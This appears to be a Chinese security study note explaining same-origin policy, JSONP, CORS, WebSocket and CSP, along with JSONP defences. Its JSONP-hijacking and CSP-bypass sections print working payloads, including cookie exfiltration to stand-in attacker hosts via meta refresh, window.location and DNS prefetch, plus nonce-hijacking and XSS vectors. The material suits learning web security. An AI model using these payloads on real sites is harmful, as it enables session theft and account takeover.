---
title: 同源策略和域安全
date: 2020-1-22 20:07:00
---
## 同源策略

同源策略是目前所有浏览器都实行的一种安全政策。

A网页设置的 Cookie，B网页不能打开，除非这两个网页同源。

所谓同源，是指：

**两个网页，协议(protocol)、端口(port)、和主机(host)都相同.**

如果非同源，以下三种行为受到限制：

> （1） Cookie、`LocalStorage` 和 `IndexDB` 无法读取。
>
> （2） DOM 无法获得。
>
> （3） AJAX 请求不能发送。

**同源策略，哪些东西是同源可以获取到的？**

> `cookie：` 服务器写入浏览器的一小段信息，只有同源的网页才能共享
>
> `DOM：` 	如果两个网页不同源，就无法拿到对方的DOM ； 典型的例子是`iframe`窗口和`window.open`方法打开的窗口，它们与父窗口无法通信 

**如果子域名和顶级域名不同源，在哪里可以设置叫他们同源？**

两个网页一级域名相同，只是二级域名不同，浏览器允许通过设置`document.domain`属性共享 Cookie，拿到DOM等。

在根域范围内，可以 把domain属性的值设置为它的上一级域 ；

```js
// 对于文档 www.example.com/good.html,
document.domain = "example.com";
var domain = document.domain;
//上边的写法是正确的
//但不能设置为 "example.com" 或者"example.org"
```

**Ajax是否遵循同源策略？**

同源政策规定，AJAX请求只能发给同源的网址，否则就报错 

**不同浏览器之间，安全策略有哪些不同？比如chrome，firefox，IE**

当涉及到同源策略时，Internet Explorer 有两个主要的不同点

- **授信范围**（Trust Zones）：两个相互之间高度互信的域名，如公司域名（corporate domains），不遵守同源策略的限制。
- **端口**：IE 未将端口号加入到同源策略的组成部分之中，
- 因此 `http://company.com:81/index.html` 和 `http://company.com/index.html`  属于同源并且不受任何限制

**如何规避同源策略？**

> - 以下三种方法可以规避同源策略的限制
> - JSONP
> - CORS
> - WebSocket

## JSONP

`JSONP`是服务器与客户端跨源通信的常用方法 

`JSON with Padding`，填充式`JSON`或者说是参数式`JSON`

`JSONP`原理就是动态插入带有`跨域url`的`<script>`标签，然后调用回调函数

 **基本语法如下**：

```json
callback({ "name": "wintrysec" , "msg": "获取成功" });
```

**`JSONP`两部分组成：回调函数和里面的数据。**
 回调函数是当响应到来时，应该在页面中调用的函数，一般是在发送过去的请求中指定 

 向服务器请求`JSON`数据，这种做法不受同源政策限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来 

```javascript
function addScriptTag(src) {
  var script = document.createElement('script');
  script.setAttribute("type","text/javascript");
  script.src = src;
  document.body.appendChild(script);
}

window.onload = function () {
  addScriptTag('http://example.com/ip?callback=foo');
}

function foo(data) {
  console.log('Your public IP address is: ' + data.ip);
};
//该请求的查询字符串有一个callback参数，用来指定回调函数的名字，这对于JSONP是必需的
```

服务器收到这个请求以后，会将数据放在回调函数的参数位置返回 

```javascript
foo({
  "ip": "8.8.8.8"
});
```

由于`<script>`元素请求的脚本，直接作为代码运行。

这时，只要浏览器定义了`foo`函数，该函数就会立即调用。

作为参数的`JSON`数据被视为JavaScript对象，而不是字符串，因此避免了使用`JSON.parse`的步骤 

### JSONP的劫持

 `JSON` 劫持又为 `JSON Hijacking` ，这个问题属于 `CSRF` 攻击范畴。
 当某网站通过 `JSONP` 的方式来跨域（一般为子域）传递用户认证后的敏感信息时
 攻击者可以构造恶意的 `JSONP` 调用页面，诱导被攻击者访问，来达到截取用户敏感信息的目的

 一个典型的 `JSON Hijacking` 攻击代码(`wooyun`)：
```javascript
 <script>
 function wooyun(v){
   alert(v.username);
 }
 </script>
 <script src="http:/xx.cn/?o=sso&m=info&func=wooyun"></script>
```

当被攻击者在登陆 360 网站的情况下访问了该网页时，那么用户的隐私数据（如用户名，邮箱等）可能被攻击者劫持

### JSONP防御

**1. 验证 `JSON` 文件调用的来源 `Referer`** 

```javascript
 <script> 远程加载 JSON 文件时会发送 Referer 
 在网站输出 JSON 数据时判断 Referer 是不是白名单合法的，就可以进行防御
```

**2.随机 token**

存在reference伪造(qq.com.evil.com)、空reference、暴力穷举等问题

[强大的PHP伪造IP头、Cookies、Reference](https://www.cnblogs.com/subsir/articles/2574670.html)

最有效的方式还是 综合防御(判断reference和添加随机字串)，或使用加在`url`中的token可以完美解决
但是只要在该网站上出现一个 `XSS` 漏洞，那么利用这个 `XSS` 漏洞可能让你的防御体系瞬间崩溃

**3.`callback`函数可定义的安全问题**
callback函数的名称可以自定义，而输出环境又是`js`环境，如果没有严格过滤或审查，可以引起很多其他的攻击方式。

比如后台使用`$callback = $_GET['callback'];print $callback.(data);`
这样子，认为callback是可信的，而攻击者完全可以将`alert(/xss/)`作为callback参数传递进去。

**这种问题有两种解决方案：**

**(1) 严格定义 `Content-Type: application / json`**
这样的防御机制导致了浏览器不解析恶意插入的 `XSS` 代码

**(2 )过滤 callback 以及 `JSON` 数据输出**
这样的防御机制是比较传统的攻防思维，对输出点进行 `xss` 过滤 

## WebSocket

`WebSocket`是一种通信协议，使用`ws://`（非加密）和`wss://`（加密）作为协议前缀。

该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。 

**为什么？**

`WebSocket`请求的头信息中有一个字段是`Origin`，表示该请求的请求源（origin），即发自哪个域名。

正是因为有了`Origin`这个字段，所以`WebSocket`才没有实行同源政策。

因为服务器可以根据这个字段，判断是否许可本次通信。 

## CORS(重点)

`CORS`是跨域资源共享（Cross-Origin Resource Sharing）的缩写。

它允许浏览器向跨源服务器，发出[`XMLHttpRequest`](http://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html)请求，从而克服了AJAX只能[同源](http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html)使用的限制 

它是`W3C`标准，是跨源AJAX请求的根本解决方法。

`CORS`请求大致和`ajax`请求类似，但是在HTTP头信息中加上了Origin字段表明请求来自哪个源。

如果`orgin`是许可范围之内的话，服务器返回的响应会多出`Access-Control-Allow-*`的字段

### 简单请求

只要同时满足以下两大条件，就属于简单请求。
**(1) 请求方法是以下三种方法之一**

> HEAD
>
> GET
>
> POST

**(2) HTTP的头信息不超出以下几种字段：**

> Accept
>
> Accept-Language
>
> Content-Language
>
> Last-Event-ID
>
> Content-Type：只限于三个值 `application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain` 

浏览器发现这次跨源AJAX请求是简单请求，就自动在头信息之中，添加一个Origin字段

```http
GET /cors HTTP/1.1
Origin: http://api.b.com
Host: api.a.com

Origin字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）
服务器根据这个值，决定是否同意这次请求
```

 

简单请求有三个重要的响应头

**(1) Access-Control-Allow-Origin**

该字段是必须的,它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求

**(2)Access-Control-Allow-Credentials**

该字段可选,它的值是一个布尔值，表示是否允许发送Cookie。

默认情况下，Cookie不包括在`CORS`请求之中。

设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。

这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可

**(3) Access-Control-Expose-Headers**

该字段可选，`CORS`请求时，`XMLHttpRequest`对象的`getResponseHeader()`方法只能拿到6个基本字段：

`Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma`。

如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。

例如，`getResponseHeader('wintrysec')`可以返回`wintrysec`字段的值



**响应字段，可请求资源范围**

```http
Access-Control-Allow-Origin：*  //表示同意任意跨源请求
```

### 非简单请求

> 即对服务器有特殊要求的请求，比如PUT方法，自定义HTTP-HEAD头部等
>
> 非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为"预检"请求
>
> "预检"请求用OPTIONS方法询问服务器允许的方法 

 "预检"请求的头信息包括两个特殊字段。
 **(1)Access-Control-Request-Method**
 该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法.
 **(2)Access-Control-Request-Headers**
 指定浏览器`CORS`请求会额外发送的`http`头部信息字段，多个字段用逗号分隔 



如果浏览器否定了"预检"请求，会返回一个正常的HTTP回应，但是没有任何`CORS`相关的头信息字段响应

服务器响应的其他`CORS`相关字段如下：

```http
Access-Control-Allow-Methods: GET, POST, PUT		//服务器支持的所有跨域请求的方法
Access-Control-Allow-Headers: X-Custom-Header		//服务器支持的所有头信息字段
Access-Control-Allow-Credentials: true				//表示是否允许发送Cookie
Access-Control-Max-Age: 1728000						//用来指定本次预检请求的有效期，单位为秒
```

一旦服务器通过了"预检"请求，以后每次浏览器正常的`CORS`请求，就都跟简单请求一样，会有一个Origin头信息字段。

服务器的回应，也都会有一个`Access-Control-Allow-Origin`头信息字段

`Github`上的一个POC：https://github.com/trustedsec/cors-poc

```bash
python3 -m http.server --cgi
```

### 与JSONP的比较

`CORS`与`JSONP`的使用目的相同，但是比`JSONP`更强大。

`JSONP`只支持GET请求，`CORS`支持所有类型的HTTP请求。

`JSONP`的优势在于支持老式浏览器，以及可以向不支持`CORS`的网站请求数据。



## CSP是什么？如何设置CSP？

`CSP`（Content Security Policy）浏览器内容安全策略， 为了缓解部分跨站脚本问题 。 

`CSP`的实质就是白名单机制，对网站加载或执行的资源进行安全策略的控制。 

**两种方法启用`CSP`**

```c
1. 添加HTTP头信息；
Content-Security-Policy: script-src 'self'; object-src 'none'; style-src cdn.example.org; child-src https:
2. 使用<meta>标签
<meta http-equiv="Content-Security-Policy" content="script-src 'self'; object-src 'none'; style-src cdn.example.org; child-src https:">
参数解释

script-src(脚本)：只信任当前域名
object-src(标签)：不信任任何URL，即不加载任何资源
样式表：只信任http://cdn.example.org
框架（frame）：必须使用HTTPS协议加载
```

`CSP`各种限制选项参考：[知乎回答](https://www.zhihu.com/question/21979782)，[CSP基础语法和绕过](https://www.mi1k7ea.com/2019/02/24/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E5%B0%8F%E7%BB%93/)

### 绕过CSP(1、2、3、5 重点)

**1.`URL`跳转**

在`default-src` 'none'的情况下，可以使用meta标签实现跳转

```html
<meta http-equiv="refresh" content="1;url=http://www.xss.com/x.php?c=[cookie]" >
```

在允许`unsafe-inline`的情况下，可以用`window.location`，或者`window.open`之类的方法进行跳转绕过

```html
<script>
  window.location="http://www.xss.com/x.php?c=[cookie]";
</script>
```

**2.`link`标签预加载**

在Firefox下，可以将cookie作为子域名，用`dns预解析`的方式把cookie带出去，查看`dns`服务器的日志就能得到cookie 

```html
<link rel="dns-prefetch" href="//[cookie].xxx.ceye.io">
```

**3.利用浏览器补全** 

有些网站限制只有某些脚本才能使用，往往会使用script标签的nonce属性，只有nonce一致的脚本才生效 

```http
Content-Security-Policy: default-src 'none';script-src 'nonce-abc'

//CSP设置nonce为abc属性的标签
```

那么当脚本插入点为如下的情况时

```html
<p>插入点</p>
<script id="aa" nonce="abc">document.write('CSP');</script>
```

可以插入

```html
<script src=//14.rs a="
```

这样会拼成一个新的script标签，其中的`src`可以自由设定

```html
<p><script src=//14.rs a="</p>
<script id="aa" nonce="abc">document.write('CSP');</script>
```

**4.代码重用**

假设页面中使用了`Jquery-mobile`库，并且`CSP`策略中包含"`script-src` '`unsafe-eval`' "或者"`script-src` 'strict-dynamic'"

那么下面的向量就可以绕过`CSP`：

```html
<div data-role=popup id='<script>alert(1)</script>'></div>
```

**5.`ifrmae`**

(1) 如果页面A中有`CSP`限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过`CSP`： 

```html
<iframe src="B"></iframe>
```

(2) 在Chrome下，`iframe`标签支持`csp`属性，这有时候可以用来绕过一些防御，

例如"http://xxx"页面有个`js`库会过滤`XSS`向量，我们就可以使用`csp`属性来禁掉这个`js`库

```html
<iframe csp="script-src 'unsafe-inline'" src="http://xxx"></iframe>
```

**6.`meta`标签**

 meta标签有一些不常用的功能有时候有奇效：
 meta可以控制缓存（在header没有设置的情况下），有时候可以用来绕过`CSP nonce` 

```html
<meta http-equiv="cache-control" content="public">
```

 meta可以设置Cookie（Firefox下），可以结合self-xss利用 

```html
<meta http-equiv="Set-Cookie" Content="cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21 GMT; path=/">
```

